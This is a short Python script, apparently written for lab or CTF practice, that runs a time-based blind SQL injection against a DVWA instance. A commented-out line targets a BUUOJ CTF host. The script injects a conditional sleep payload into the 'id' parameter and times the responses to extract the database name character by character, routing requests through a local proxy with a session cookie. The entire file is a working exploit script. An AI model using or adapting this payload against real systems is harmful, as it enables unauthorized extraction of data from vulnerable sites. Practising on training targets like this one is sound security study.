import requests
import time
dic = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}.-~'
flag = ''
j= 1
for x in range(1, 50):
    for i in dic:
        s = ord(i)
       # url ='http://58b7588b-2a48-4722-bed4-7ba332155777.node3.buuoj.cn/?inject=1%%27and if(ascii(substr(version(),1,1))=%d,sleep(5),null)%%23'%s
        url = 'http://192.200.30.104/dvwa/vulnerabilities/sqli/?id=1%%27and if(ascii(substr(database(),%d,1))=%d,sleep(10),null)%%23&Submit=Submit#'%(x,s)
        proxy = {
            "http":"127.0.0.1:8080"
        }
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Connection":"keep-alive",
            "Cookie": "security=low; PHPSESSID=g2kn686ppj0skkh5p7dvl6kqq0",
            "Host":"192.200.30.104",
            "Upgrade-Insecure-Requests":"1",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
        }
        r  = requests.get(url , headers=headers ,proxies=proxy )
        c  = r.status_code
        j = j+1
        print('----------------------------------------------------------------')
        print('第%d次请求'%j)
        print('状态码是：',c,'请求字符:',i,'ASCII码值：',s,'当前值是：',flag)

        print('----------------------------------------------------------------')
        t  = r.elapsed.total_seconds()
        if  t > 5:
             print('字母是：'+i)
             flag = flag + i
             print(t)
             print(flag)
print('数据库名是:'+flag)


